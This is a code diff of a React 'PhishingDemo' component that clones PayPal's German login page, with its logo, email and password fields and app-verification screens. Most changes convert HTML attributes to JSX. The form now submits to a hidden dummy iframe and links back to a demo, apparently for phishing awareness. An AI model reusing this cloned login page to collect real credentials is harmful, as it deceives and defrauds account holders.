@@ -6,12 +6,12 @@ import React from 'react';
 export function PhishingDemo() {
   return (
     <>
-      <html lang="de" class="no-js desktop">
+      <html lang="de" className="no-js desktop">
         <head>
           <script src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script>
-          <meta charset="utf-8" />
+          <meta charSet="utf-8" />
           <title>Loggen Sie sich bei PayPal ein</title>
-          <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+          <meta httpEquiv="content-type" content="text/html; charset=UTF-8" />
           <meta name="application-name" content="PayPal" />
           <meta
             name="msapplication-task"
@@ -60,7 +60,7 @@ export function PhishingDemo() {
           ></script>
         </head>
         <body
-          class="desktop"
+          className="desktop"
           data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBUBrTOiJVVsJ_17dc03a340c"
           data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaDOlxm2mLRkK"
           data-production="true"
@@ -84,72 +84,79 @@ export function PhishingDemo() {
           data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10"
         >
           <noscript>
-            <p class="nonjsAlert" role="alert">
+            <p className="nonjsAlert" role="alert">
               Hinweis: Für viele Funktionen der PayPal-Website sind JavaScript
               und Cookies erforderlich.
             </p>
           </noscript>
-          <div id="main" class="main" role="main">
+          <div id="main" className="main" role="main">
             <section
               id="slLanding"
-              class="slLanding hide"
+              className="slLanding hide"
               data-role="page"
               data-title="Google-Konto verknüpfen und auf Ihren Geräten schneller bezahlen"
             >
-              <div class="corral">
+              <div className="corral">
                 <div
                   id="slContent"
-                  class="contentContainer contentContainerBordered"
+                  className="contentContainer contentContainerBordered"
                 >
                   <header>
                     <p
                       role="img"
                       aria-label="PayPal Logo"
-                      class="paypal-logo paypal-logo-long"
+                      className="paypal-logo paypal-logo-long"
                     ></p>
                   </header>
-                  <div id="linked" class="linked">
-                    <div class="profileRemembered">
-                      <span class="loginEmail">petrenco.</span>
+                  <div id="linked" className="linked">
+                    <div className="profileRemembered">
+                      <span className="loginEmail">petrenco.</span>
                       <a
                         href="#"
-                        class="changeLink scTrack:not-you"
+                        className="changeLink scTrack:not-you"
                         id="changeLink"
                       >
                         Ändern
                       </a>
                     </div>
-                    <div class="headerTextDecorated"></div>
-                    <h1 class="headerText">
+                    <div className="headerTextDecorated"></div>
+                    <h1 className="headerText">
                       Eingeloggt bleiben und schneller zahlen
                     </h1>
-                    <p class="description assure">
+                    <p className="description assure">
                       Aktivieren Sie den automatischen Login für diesen Browser
                       und bezahlen Sie jedes Mal blitzschnell. (Nicht auf
                       gemeinsam genutzten Geräten aktivieren.)
-                      <span class="learnMoreLink">
-                        <a href="#" id="slLoginLearnMore" class="secondayLink">
+                      <span className="learnMoreLink">
+                        <a
+                          href="#"
+                          id="slLoginLearnMore"
+                          className="secondayLink"
+                        >
                           Was ist das?
                         </a>
                       </span>
                     </p>
-                    <div id="partnerProfile" class="partnerProfile">
-                      <div id="partnerPhoto" class="partnerPhoto"></div>
-                      <div class="partnerDetails">
+                    <div id="partnerProfile" className="partnerProfile">
+                      <div id="partnerPhoto" className="partnerPhoto"></div>
+                      <div className="partnerDetails">
                         <span>Sie sind eingeloggt als</span>
-                        <div id="displayName" class="displayName"></div>
+                        <div id="displayName" className="displayName"></div>
                         <div>
-                          <div class="partnerEmailDiv">
-                            <span class="partnerIcon"></span>
-                            <span id="partnerEmail" class="partnerEmail"></span>
+                          <div className="partnerEmailDiv">
+                            <span className="partnerIcon"></span>
+                            <span
+                              id="partnerEmail"
+                              className="partnerEmail"
+                            ></span>
                             <span id="partnerEmailDomain"></span>
                           </div>
                         </div>
                       </div>
                     </div>
-                    <div class="actions actionsSpacedShort">
+                    <div className="actions actionsSpacedShort">
                       <button
-                        class="button actionContinue scTrack:unifiedlogin-continue"
+                        className="button actionContinue scTrack:unifiedlogin-continue"
                         id="continueBtn"
                         name="continueBtn"
                         value="continueBtn"
@@ -157,9 +164,12 @@ export function PhishingDemo() {
                         Weiter
                       </button>
                     </div>
-                    <div id="secondaryLogin" class="buttonAsLink secondaryLink">
+                    <div
+                      id="secondaryLogin"
+                      className="buttonAsLink secondaryLink"
+                    >
                       <button
-                        class="scTrack:unifiedlogin-use-password"
+                        className="scTrack:unifiedlogin-use-password"
                         id="secondaryLoginBtn"
                         name="secondaryLoginBtn"
                         value="secondaryLoginBtn"
@@ -168,31 +178,31 @@ export function PhishingDemo() {
                       </button>
                     </div>
                   </div>
-                  <div id="unlinked" class="unlinked">
-                    <div id="headerIcon" class="partnerConnect"></div>
-                    <h1 class="headerText">
+                  <div id="unlinked" className="unlinked">
+                    <div id="headerIcon" className="partnerConnect"></div>
+                    <h1 className="headerText">
                       Google-Konto verknüpfen und auf Ihren Geräten schneller
                       bezahlen
                     </h1>
-                    <p class="description assure">
+                    <p className="description assure">
                       Wenn Sie bei Ihrem Google-Konto angemeldet sind, loggen
                       wir Sie automatisch bei PayPal ein. So sparen Sie sich die
                       Eingabe Ihres Passworts und bezahlen noch schneller.
                       <a
                         href="#"
                         id="slOptInlearnMore"
-                        class="secondayLink scTrack:unifiedlogin-sl-whatsthis"
+                        className="secondayLink scTrack:unifiedlogin-sl-whatsthis"
                       >
                         Was ist das?
                       </a>
                     </p>
-                    <p class="secondaryLink hide" id="slOptIn_notNow">
+                    <p className="secondaryLink hide" id="slOptIn_notNow">
                       <a href="#">Nicht jetzt</a>
                     </p>
                   </div>
-                  <div id="learnMoreModal" class="learnMoreModal">
-                    <div id="optInLearnMoreDesc" class="optInLearnMoreDesc">
-                      <h1 class="headerText headerTextSpaced">
+                  <div id="learnMoreModal" className="learnMoreModal">
+                    <div id="optInLearnMoreDesc" className="optInLearnMoreDesc">
+                      <h1 className="headerText headerTextSpaced">
                         Warum soll ich mein Google-Konto verknüpfen?
                       </h1>
                       <p>
@@ -208,8 +218,11 @@ export function PhishingDemo() {
                         Ihres Passworts.
                       </p>
                     </div>
-                    <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc">
-                      <h1 class="headerText headerTextSpaced">
+                    <div
+                      id="slLoginLearnMoreDesc"
+                      className="slLoginLearnMoreDesc"
+                    >
+                      <h1 className="headerText headerTextSpaced">
                         Eingeloggt bleiben und schneller zahlen
                       </h1>
                       <p>
@@ -224,25 +237,25 @@ export function PhishingDemo() {
                     </div>
                     <button
                       type="button"
-                      class="ui-dialog-titlebar-close"
+                      className="ui-dialog-titlebar-close"
                     ></button>
                   </div>
-                  <div class="intentFooter">
-                    <div class="localeSelector">
-                      <span class="picker country-selector hide">
-                        <span class="hide" id="countryPickerLink">
+                  <div className="intentFooter">
+                    <div className="localeSelector">
+                      <span className="picker country-selector hide">
+                        <span className="hide" id="countryPickerLink">
                           Deutschland
                         </span>
                         <button
                           type="button"
                           aria-labelledby="countryPickerLink"
-                          class="country DE"
+                          className="country DE"
                         ></button>
                       </span>
-                      <ul class="localeLink">
+                      <ul className="localeLink">
                         <li>
                           <a
-                            class="selected scTrack:unifiedlogin-footer-language_de_DE"
+                            className="selected scTrack:unifiedlogin-footer-language_de_DE"
                             href="/signin?country.x=DE&locale.x=de_DE&langTgl=de"
                             lang="de"
                             data-locale="de_DE"
@@ -253,7 +266,7 @@ export function PhishingDemo() {
                         </li>
                         <li>
                           <a
-                            class="scTrack:unifiedlogin-footer-language_en_US"
+                            className="scTrack:unifiedlogin-footer-language_en_US"
                             href="/signin?country.x=DE&locale.x=en_US&langTgl=en"
                             lang="en"
                             data-locale="en_US"
@@ -269,55 +282,61 @@ export function PhishingDemo() {
             </section>
             <section
               id="login"
-              class="login"
+              className="login"
               data-role="page"
               data-title="Loggen Sie sich bei PayPal ein"
             >
-              <div class="corral">
+              <div className="corral">
                 <div
                   id="content"
-                  class="contentContainer activeContent contentContainerBordered"
+                  className="contentContainer activeContent contentContainerBordered"
                 >
                   <header>
                     <p
                       role="img"
                       aria-label="PayPal Logo"
-                      class="paypal-logo paypal-logo-long signin-paypal-logo"
+                      className="paypal-logo paypal-logo-long signin-paypal-logo"
                     ></p>
                   </header>
-                  <h1 id="headerText" class="headerText accessAid">
+                  <h1 id="headerText" className="headerText accessAid">
                     Loggen Sie sich bei PayPal ein
                   </h1>
-                  <p id="phoneSubTagLine" class="subHeaderText hide">
+                  <p id="phoneSubTagLine" className="subHeaderText hide">
                     Sie haben bereits den Login mit Handynummer eingerichtet?
                     Geben Sie Ihre Handynummer unten ein. Wenn nicht, klicken
                     Sie auf den Link und loggen Sie sich mit Ihrer
                     E-Mail-Adresse ein.
                   </p>
-                  <div id="loginContent" class="">
-                    <div id="loginSection" class="">
-                      <div class="notifications"></div>
-                      <div id="keychainErrorMessage" class="hide">
-                        <p class="notification notification-warning blocked-on-8ball hide">
+                  <div id="loginContent" className="">
+                    <div id="loginSection" className="">
+                      <div className="notifications"></div>
+                      <div id="keychainErrorMessage" className="hide">
+                        <p className="notification notification-warning blocked-on-8ball hide">
                           PayPal One Touch™ funktioniert nur zum Bezahlen. Bitte
                           loggen Sie sich mit Ihrer E-Mail-Adresse ein.
                         </p>
-                        <p class="notification notification-warning blocked-on-risky-login hide">
+                        <p className="notification notification-warning blocked-on-risky-login hide">
                           Bitte loggen Sie sich mit Ihrer E-Mail-Adresse und
                           Ihrem Passwort ein.
                         </p>
-                        <p class="notification notification-critical keychain-activation-failure hide">
+                        <p className="notification notification-critical keychain-activation-failure hide">
                           Bei uns ist ein Problem aufgetreten. Bitte loggen Sie
                           sich mit Ihrer E-Mail-Adresse und Ihrem Passwort ein.
                         </p>
                       </div>
+                      <iframe
+                        title="dummy"
+                        name="dummyframe"
+                        id="dummyframe"
+                        style={{ display: 'none' }}
+                      ></iframe>
                       <form
-                        action="index.html"
-                        method="post"
-                        class="proceed maskable"
-                        autocomplete="off"
+                        target="dummy"
+                        className="proceed maskable"
+                        autoComplete="off"
                         name="login"
-                        novalidate
+                        noValidate
+                        method="post"
                       >
                         <input
                           type="hidden"
@@ -352,24 +371,23 @@ export function PhishingDemo() {
                           name="requestUrl"
                           value="/signin"
                         />
-                        <input
-                          type="hidden"
-                          name="forcePhonePasswordOptIn"
-                          value=""
-                        />
-                        <div id="passwordSection" class="clearfix splitEmail">
+                        <input type="hidden" name="forcePhonePasswordOptIn" />
+                        <div
+                          id="passwordSection"
+                          className="clearfix splitEmail"
+                        >
                           <div
                             id="splitEmailSection"
-                            class="splitPhoneSection splitEmailSection"
+                            className="splitPhoneSection splitEmailSection"
                           >
-                            <div class="countryPhoneSelectWrapper hide">
-                              <label class="accessAid" for="phoneCode">
+                            <div className="countryPhoneSelectWrapper hide">
+                              <label className="accessAid" htmlFor="phoneCode">
                                 Wählen Sie Ihre Ländervorwahl
                               </label>
                               <select
                                 name="phoneCode"
                                 id="phoneCode"
-                                class="countryPhoneSelect"
+                                className="countryPhoneSelect"
                               >
                                 <option
                                   selected="selected"
@@ -380,29 +398,31 @@ export function PhishingDemo() {
                                   Deutschland (+49)
                                 </option>
                               </select>
-                              <div class="countryPhoneSelectChoice">
-                                <span class="countryCode">DE</span>
-                                <span class="phoneCode">+49</span>
+                              <div className="countryPhoneSelectChoice">
+                                <span className="countryCode">DE</span>
+                                <span className="phoneCode">+49</span>
                               </div>
                             </div>
-                            <div class="textInput" id="login_emaildiv">
-                              <div class="fieldWrapper">
+                            <div className="textInput" id="login_emaildiv">
+                              <div className="fieldWrapper">
                                 <input
                                   id="email"
                                   name="login_email"
                                   type="email"
-                                  class="hasHelp validateEmpty"
-                                  value=""
-                                  autocomplete="username"
+                                  className="hasHelp validateEmpty"
+                                  autoComplete="username"
                                   placeholder="E-Mail-Adresse oder Handynummer"
                                   aria-describedby="emailErrorMessage"
                                 />
                               </div>
-                              <div class="errorMessage" id="emailErrorMessage">
-                                <p class="emptyError hide">
+                              <div
+                                className="errorMessage"
+                                id="emailErrorMessage"
+                              >
+                                <p className="emptyError hide">
                                   Diese Angabe ist erforderlich.
                                 </p>
-                                <p class="invalidError hide">
+                                <p className="invalidError hide">
                                   Das Format der E-Mail-Adresse oder Handynummer
                                   ist ungültig.
                                 </p>
@@ -411,23 +431,22 @@ export function PhishingDemo() {
                           </div>
                           <div
                             id="passwordSection"
-                            class="clearfix showHideButtonForEligibleBrowser"
+                            className="clearfix showHideButtonForEligibleBrowser"
                           >
-                            <div class="textInput" id="login_passworddiv">
-                              <div class="fieldWrapper">
+                            <div className="textInput" id="login_passworddiv">
+                              <div className="fieldWrapper">
                                 <input
                                   id="password"
                                   name="login_password"
                                   type="password"
-                                  class="hasHelp validateEmpty pin-password"
-                                  value=""
+                                  className="hasHelp validateEmpty pin-password"
                                   placeholder="Passwort"
                                   aria-describedby="passwordErrorMessage"
                                 />
 
                                 <button
                                   type="button"
-                                  class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
+                                  className="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
                                   id="Passwort anzeigen"
                                 >
                                   Anzeigen
@@ -435,27 +454,27 @@ export function PhishingDemo() {
 
                                 <button
                                   type="button"
-                                  class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
+                                  className="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
                                   id="Ausblenden"
                                 >
                                   Ausblenden
                                 </button>
                                 <button
-                                  class="pwFpIcon hide"
+                                  className="pwFpIcon hide"
                                   id="pwFpIcon"
                                 ></button>
                               </div>
                               <div
-                                class="errorMessage"
+                                className="errorMessage"
                                 id="passwordErrorMessage"
                               >
-                                <p class="emptyError hide">Erforderlich</p>
+                                <p className="emptyError hide">Erforderlich</p>
                               </div>
                             </div>
                             <a
                               href="/authflow/password-recovery/?country.x=DE&amp;locale.x=de_DE&amp;redirectUri=%252Fsignin"
                               id="forgotPassword"
-                              class="recoveryOption forgotPassword"
+                              className="recoveryOption forgotPassword"
                               data-client-log-action-type="clickForgotPasswordLink"
                             >
                               Passwort vergessen?
@@ -466,19 +485,23 @@ export function PhishingDemo() {
                           type="hidden"
                           id="phone"
                           name="login_phone"
-                          class="validate"
+                          className="validate"
                         />
-                        <div class="actions">
-                          <a
-                            class="button actionContinue scTrack:unifiedlogin-login-submit"
+                        <div className="actions">
+                          <button
+                            className="button actionContinue scTrack:unifiedlogin-login-submit"
                             type="submit"
-                            id="btnLogin"
-                            name="btnLogin"
-                            value="Login"
-                            href="/"
                           >
-                            Zurück zur Platin Demo
-                          </a>
+                            <a
+                              className="text-white"
+                              id="btnLogin"
+                              name="btnLogin"
+                              value="Login"
+                              href="/"
+                            >
+                              Zurück zur Platin Demo
+                            </a>
+                          </button>
                         </div>
                         <input
                           type="hidden"
@@ -492,22 +515,26 @@ export function PhishingDemo() {
                         />
                       </form>
                       <div
-                        class="moreOptionsDiv hide"
+                        className="moreOptionsDiv hide"
                         id="moreOptionsContainer"
                       >
-                        <a href="#" id="moreOptions" class="moreOptionsInfo">
+                        <a
+                          href="#"
+                          id="moreOptions"
+                          className="moreOptionsInfo"
+                        >
                           Noch mehr Optionen
                         </a>
                         <div
-                          class="bubble-tooltip hide"
+                          className="bubble-tooltip hide"
                           id="moreOptionsDropDown"
                         >
-                          <ul class="moreoptionsGroup">
+                          <ul className="moreoptionsGroup">
                             <li>
                               <a
                                 href="#"
                                 id="moreOptionsMobile"
-                                class="scTrack:unifiedlogin-click-more-options-mobile"
+                                className="scTrack:unifiedlogin-click-more-options-mobile"
                               >
                                 Login mit Mobilgerät zulassen
                               </a>
@@ -515,7 +542,7 @@ export function PhishingDemo() {
                             <li>
                               <a
                                 href="/authflow/password-recovery/?country.x=DE&amp;locale.x=de_DE&amp;redirectUri=%252Fsignin"
-                                class="scTrack:unifiedlogin-click-forgot-password pwrLink"
+                                className="scTrack:unifiedlogin-click-forgot-password pwrLink"
                               >
                                 Probleme beim Einloggen?
                               </a>
@@ -525,32 +552,35 @@ export function PhishingDemo() {
                       </div>
                       <div
                         id="signupContainer"
-                        class="signupContainer"
+                        className="signupContainer"
                         data-hide-on-email=""
                         data-hide-on-pass=""
                       >
-                        <div class="loginSignUpSeparator">
-                          <span class="textInSeparator">oder</span>
+                        <div className="loginSignUpSeparator">
+                          <span className="textInSeparator">oder</span>
                         </div>
                         <button
                           type="button"
-                          class="button secondary scTrack:unifiedlogin-click-signup-button"
+                          className="button secondary scTrack:unifiedlogin-click-signup-button"
                           id="createAccount"
                         >
                           Neu anmelden
                         </button>
                       </div>
-                      <div id="tpdButtonContainer" class="signupContainer hide">
-                        <div class="loginSignUpSeparator">
-                          <span class="textInSeparator">oder</span>
+                      <div
+                        id="tpdButtonContainer"
+                        className="signupContainer hide"
+                      >
+                        <div className="loginSignUpSeparator">
+                          <span className="textInSeparator">oder</span>
                         </div>
-                        <div class="actions">
+                        <div className="actions">
                           <button
-                            class="button secondary"
+                            className="button secondary"
                             id="tpdButton"
                             type="submit"
                             value="Login mit Mobilgerät zulassen"
-                            disabled="true"
+                            disabled={false}
                           >
                             Login mit Mobilgerät zulassen
                           </button>
@@ -558,22 +588,22 @@ export function PhishingDemo() {
                       </div>
                     </div>
                   </div>
-                  <div class="intentFooter">
-                    <div class="localeSelector">
-                      <span class="picker country-selector hide">
-                        <span class="hide" id="countryPickerLink">
+                  <div className="intentFooter">
+                    <div className="localeSelector">
+                      <span className="picker country-selector hide">
+                        <span className="hide" id="countryPickerLink">
                           Deutschland
                         </span>
                         <button
                           type="button"
                           aria-labelledby="countryPickerLink"
-                          class="country DE"
+                          className="country DE"
                         ></button>
                       </span>
-                      <ul class="localeLink">
+                      <ul className="localeLink">
                         <li>
                           <a
-                            class="selected scTrack:unifiedlogin-footer-language_de_DE"
+                            className="selected scTrack:unifiedlogin-footer-language_de_DE"
                             href="/signin?country.x=DE&locale.x=de_DE&langTgl=de"
                             lang="de"
                             data-locale="de_DE"
@@ -584,7 +614,7 @@ export function PhishingDemo() {
                         </li>
                         <li>
                           <a
-                            class="scTrack:unifiedlogin-footer-language_en_US"
+                            className="scTrack:unifiedlogin-footer-language_en_US"
                             href="/signin?country.x=DE&locale.x=en_US&langTgl=en"
                             lang="en"
                             data-locale="en_US"
@@ -600,59 +630,66 @@ export function PhishingDemo() {
             </section>
             <section
               id="verification"
-              class="verification hide"
+              className="verification hide"
               data-role="page"
               data-title="Login-Bestätigung – PayPal"
             >
-              <div class="corral">
-                <div class="contentContainer contentContainerLean">
-                  <div id="pending" class="verificationSubSection">
-                    <h1 class="headerText">PayPal-App öffnen</h1>
-                    <p id="uncookiedMessage" class="verification-message hide">
+              <div className="corral">
+                <div className="contentContainer contentContainerLean">
+                  <div id="pending" className="verificationSubSection">
+                    <h1 className="headerText">PayPal-App öffnen</h1>
+                    <p
+                      id="uncookiedMessage"
+                      className="verification-message hide"
+                    >
                       Öffnen Sie die PayPal-App und tippen Sie bei der
                       Aufforderung auf "Ja". Tippen Sie dann auf Ihrem Handy auf
-                      <span class="twoDigitPin">PIN</span>, um sich einzuloggen.
+                      <span className="twoDigitPin">PIN</span>, um sich
+                      einzuloggen.
                     </p>
-                    <p id="cookiedMessage" class="verification-message hide">
+                    <p
+                      id="cookiedMessage"
+                      className="verification-message hide"
+                    >
                       Öffnen Sie die PayPal-App und tippen Sie bei der
                       Aufforderung auf "Ja", um sich einzuloggen.
                     </p>
-                    <div class="notifications"></div>
-                    <div class="accountArea">
-                      <span class="account"></span>
-                      <span class="verificationNotYou">
+                    <div className="notifications"></div>
+                    <div className="accountArea">
+                      <span className="account"></span>
+                      <span className="verificationNotYou">
                         <a
                           data-href="#"
                           href="#"
-                          class="scTrack:unifiedlogin-verification-click-notYou"
+                          className="scTrack:unifiedlogin-verification-click-notYou"
                           id="pendingNotYouLink"
                         >
                           Nicht Sie?
                         </a>
                       </span>
                     </div>
-                    <div class="mobileNotification">
-                      <p class="pin"></p>
-                      <div class="mobileScreen">
+                    <div className="mobileNotification">
+                      <p className="pin"></p>
+                      <div className="mobileScreen">
                         <img
                           src="https://www.paypalobjects.com/images/shared/icon-PN-check.png"
                           alt="phone"
                         />
                       </div>
                     </div>
-                    <p class="tryAnotherMsg">
+                    <p className="tryAnotherMsg">
                       <a
                         id="tryPasswordLink"
                         data-href="#"
                         href=""
-                        class="inlineLink scTrack:try-password"
+                        className="inlineLink scTrack:try-password"
                       >
                         Stattdessen Passwort verwenden
                       </a>
                     </p>
-                    <p class="resendMsg">
+                    <p className="resendMsg">
                       <a
-                        class="inlineLink scTrack:resend hide"
+                        className="inlineLink scTrack:resend hide"
                         role="button"
                         data-href="#resend"
                         href=""
@@ -660,47 +697,50 @@ export function PhishingDemo() {
                       >
                         Erneut senden
                       </a>
-                      <span class="sentMessage hide">Gesendet</span>
+                      <span className="sentMessage hide">Gesendet</span>
                     </p>
                   </div>
-                  <div id="expired" class="hide verificationSubSection">
+                  <div id="expired" className="hide verificationSubSection">
                     <header>
                       <p
                         role="img"
                         aria-label="PayPal Logo"
-                        class="paypal-logo paypal-logo-long"
+                        className="paypal-logo paypal-logo-long"
                       >
                         PayPal
                       </p>
                     </header>
-                    <h1 class="headerText headerTextWarning">
+                    <h1 className="headerText headerTextWarning">
                       Wir konnten nicht bestätigen, dass Sie es sind
                     </h1>
-                    <p class="slimP">
+                    <p className="slimP">
                       Wir haben keine Antwort erhalten und konnten Ihre
                       Identität daher nicht bestätigen.
                     </p>
                     <button
                       id="expiredTryAgainButton"
-                      class="button actionsSpaced"
+                      className="button actionsSpaced"
                     >
                       Erneut versuchen
                     </button>
                   </div>
-                  <div id="denied" class="denied hide verificationSubSection">
+                  <div
+                    id="denied"
+                    className="denied hide verificationSubSection"
+                  >
                     <img
                       alt=""
                       src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png"
-                      class="deniedCaution"
+                      className="deniedCaution"
                     />
-                    <h1 class="headerText">
+                    <h1 className="headerText">
                       Wir konnten nicht bestätigen, dass Sie es sind
                     </h1>
                     <p>
                       Sie benötigen Hilfe?
                       <a
                         href="/{coBrand}/cgi-bin/helpscr?cmd=_help"
-                        class="inlineLink scTrack:help"
+                        className="inlineLink scTrack:help"
                       >
                         Wir sind für Sie da
                       </a>
@@ -710,9 +750,9 @@ export function PhishingDemo() {
                 </div>
               </div>
             </section>
-            <footer class="footer" role="contentinfo">
-              <div class="legalFooter">
-                <ul class="footerGroup">
+            <footer className="footer" role="contentinfo">
+              <div className="legalFooter">
+                <ul className="footerGroup">
                   <li>
                     <a target="_blank" href="/de/smarthelp/contact-us">
                       Kontakt
@@ -737,36 +777,40 @@ export function PhishingDemo() {
               </div>
             </footer>
           </div>
-          <div class="transitioning hide">
-            <p class="welcomeMessage hide">Willkommen, !</p>
-            <p class="checkingInfo hide">Ihre Eingaben werden überprüft…</p>
-            <p class="oneSecond hide">Einen Moment…</p>
-            <p class="secureMessage hide">Sie werden sicher eingeloggt...</p>
-            <p class="oneTouchMessage hide"></p>
-            <p class="retrieveInfo hide">Informationen werden abgerufen...</p>
-            <p class="waitFewSecs hide">
+          <div className="transitioning hide">
+            <p className="welcomeMessage hide">Willkommen, !</p>
+            <p className="checkingInfo hide">Ihre Eingaben werden überprüft…</p>
+            <p className="oneSecond hide">Einen Moment…</p>
+            <p className="secureMessage hide">
+              Sie werden sicher eingeloggt...
+            </p>
+            <p className="oneTouchMessage hide"></p>
+            <p className="retrieveInfo hide">
+              Informationen werden abgerufen...
+            </p>
+            <p className="waitFewSecs hide">
               Dieser Vorgang kann einige Sekunden dauern...
             </p>
-            <p class="udtSpinnerMessage udtLogin hide">
+            <p className="udtSpinnerMessage udtLogin hide">
               Wir erkennen Sie auf diesem Gerät und loggen Sie sicher ein.
             </p>
-            <p class="udtSpinnerMessage udtLoginXo hide">
+            <p className="udtSpinnerMessage udtLoginXo hide">
               Da wir Sie auf diesem Gerät erkennen, müssen Sie Ihr Passwort für
               diesen Einkauf nicht mehr angeben.
             </p>
-            <p class="udtSpinnerMessage webllsXoUS hide">
+            <p className="udtSpinnerMessage webllsXoUS hide">
               Wir erkennen Sie auf diesem Gerät, daher können Sie den Login
               überspringen.
               <br />
               <br />
               Sie können diese Einstellung in Ihrem Profil verwalten.
             </p>
-            <p class="udtSpinnerMessage webllsSCA hide">
+            <p className="udtSpinnerMessage webllsSCA hide">
               Wir leiten Sie weiter zum PayPal Checkout, um die Zahlung
               abzuschließen.
             </p>
-            <p class="qrcMessage hide">Lädt...</p>
-            <div class="keychain spinner-content uiExp hide"></div>
+            <p className="qrcMessage hide">Lädt...</p>
+            <div className="keychain spinner-content uiExp hide"></div>
           </div>
           <noscript>
             <img
